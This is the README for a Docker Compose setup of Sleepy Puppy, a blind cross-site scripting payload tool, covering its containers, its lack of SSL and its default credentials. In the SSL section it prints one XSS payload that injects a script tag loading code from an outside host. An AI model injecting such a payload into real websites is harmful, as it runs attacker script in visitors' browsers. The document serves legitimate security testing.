Sleepy Puppy ZeroToDocker
=======================


For full documentation, please see the [wiki](https://github.com/Netflix/sleepy-puppy/wiki).

This repo utilizes docker compose to launch a cluster of containers to support the sleepy-puppy project.  This is only meant to be used to **play**.  See the [Issues](#Issues) section for information regarding productionalizing these containers.

----------


Starting
-------------

> docker-compose up

Stopping
-------------
> docker-compose stop

Architecture
-------------

This project launches three containers:

 1. postgres:latest
 2. sleepy-puppy-nginx:0.2.0
 3. sleepy-puppy-web:0.2.0

Externally, only sleepy-puppy-nginx exposes any ports.  This container only exposes TCP 80.  See the [Issues](#Issues) section for an explanation of why TCP 443 was not exposed.


Issues
-------------

**No SSL**
Other containers in the zeroToDocker project use self-signed SSL certificates, as only the user will be required to have their browser accept this SSL cert.  For sleepy-puppy, the user, and anyone browsing any site with a sleepy-puppy payload would need to accept the self-signed SSL cert.

This is likely to cause confusion when trying to get a payload to fire.  To simplify the situation, the docker will not expose SSL.  To save a few characters and avoid mixed-content warnings, sleepy-puppy payloads exclude the protocol.

	> '"><script src=//ti.ht/x?u=2></script>

Because the payloads exclude the protocol, and the container is not listening on SSL, the payloads will only fire on HTTP (not HTTPS) sites.

If you plan to run this in production, you will need to obtain an SSL cert from a trusted source and modify the sleepy-puppy-nginx container to terminate the SSL.

----------

**Default credentials on the web UI**
The username for the sleepy-puppy web UI is `admin`.  The docker-compose.yml defines the password as `password` by setting the `DOCKER_ADMIN_PASS` environment variable.  

For production use, you will want to modify or remove this default account.

**Default Flask-Secret and CSRF-Secret**
The docker-compose.yml defines a `secret_key` and `csrf_session_key` environment variable which are passed into the Flask application.

For production use, you will want to modify these values.

**Default credentials on the postgres database**
The username for the postgres database is `postgres`.  The password for this database is actually set in the api-start.sh file found within the sleepy-puppy-web container.  This password is set to `password`.

You may wish to change this password for production use.


